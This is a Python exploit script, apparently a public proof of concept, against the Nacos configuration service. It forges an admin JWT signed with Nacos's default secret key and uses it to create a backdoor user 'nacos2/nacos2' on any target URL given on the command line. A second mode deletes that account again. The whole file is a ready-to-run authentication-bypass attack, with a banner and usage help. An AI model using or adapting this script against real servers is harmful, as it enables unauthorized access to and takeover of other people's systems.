import time
import requests
import jwt
import base64
from email.utils import parsedate
import argparse



banner='''
                                              
                                              

    ███╗   ██╗ █████╗  ██████╗ ██████╗ ███████╗    ███████╗██╗  ██╗██████╗ 
    ████╗  ██║██╔══██╗██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
    ██╔██╗ ██║███████║██║     ██║   ██║███████╗    █████╗   ╚███╔╝ ██████╔╝
    ██║╚██╗██║██╔══██║██║     ██║   ██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝ 
    ██║ ╚████║██║  ██║╚██████╗╚██████╔╝███████║    ███████╗██╔╝ ██╗██║     
    ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝     
    
    eg: poc.py -e/-c http://xxxx.com/
    -e/--url 执行利用程序
    -c/--clean 清理nacos2用户
    如果目标url为http://xxx.com/nacos/，请自行修改源码target为target2


                                                                    by SongShuA \n\n\n'''

print(banner)

def exp(host):

    target = "http://"+host
    #target="http://"+host+"/nacos/" #target2
    re = requests.get(target, verify=False, timeout=5,)
    times = re.headers['Date']
    times = int(time.mktime(parsedate(times)))+18000
    secret_key = 'SecretKey012345678901234567890123456789012345678901234567890123456789'
    secret_key = base64.b64encode(secret_key.encode('utf-8')).decode('utf-8')
    # 载荷
    payload = {
        "sub": "nacos",
        "exp": times
    }

    # 生成JWT
    jwt_token = jwt.encode(payload, secret_key, algorithm='HS256')

    print("本次jwt_token为：\n "+jwt_token+"\n")

    header = {"Accept": "application/json, text/plain, */*",
            "accessToken": jwt_token, }
    data = {"username": "nacos2", "password": "nacos2"}
    re2 = requests.post(target+"/v1/auth/users?accessToken=" +
                        jwt_token, verify=False, timeout=5, headers=header, data=data)
    print("利用完成，请自行验证nacos2/nacos2账户\n")


def clean(host):
    
    target = "http://"+host
    #target="http://"+host+"/nacos/" #target2
    re = requests.get(target, verify=False, timeout=5,)
    times = re.headers['Date']
    times = int(time.mktime(parsedate(times)))+18000
    secret_key = 'SecretKey012345678901234567890123456789012345678901234567890123456789'
    secret_key = base64.b64encode(secret_key.encode('utf-8')).decode('utf-8')
    # 载荷
    payload = {
        "sub": "nacos",
        "exp": times
    }

    # 生成JWT
    jwt_token = jwt.encode(payload, secret_key, algorithm='HS256')

    print("本次jwt_token为：\n "+jwt_token+"\n")

    header = {"Accept": "application/json, text/plain, */*",
            "accessToken": jwt_token, }
    re2 = requests.delete(target+"/v1/auth/users?username=nacos2&accessToken=" +
                        jwt_token, verify=False, timeout=5, headers=header,)
    print("执行完成,请自行验证nacos2账户是否遗留\n")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='eg: poc.py -e/-c xxxx.com')
    parser.add_argument('-e', '--url', help='执行利用程序')
    parser.add_argument('-c', '--clean', help='清理后门用户')
    args = parser.parse_args()



        #清理传入的host格式
    if args.url:
        if args.url.startswith('http://'):
            args.url = args.url[7:]
        elif args.url.startswith('https://'):
            args.url = args.url[8:]
        if args.url.endswith('/'):
            args.url = args.url[:-1]
    if args.clean:
        if args.clean.startswith('http://'):
            args.clean = args.clean[7:]
        elif args.clean.startswith('https://'):
            args.clean = args.clean[8:]
        if args.clean.endswith('/'):
            args.clean = args.clean[:-1]

    if args.clean:
        clean(args.clean)
    elif args.url:
        exp(args.url)
    else:
        print("请输入参数")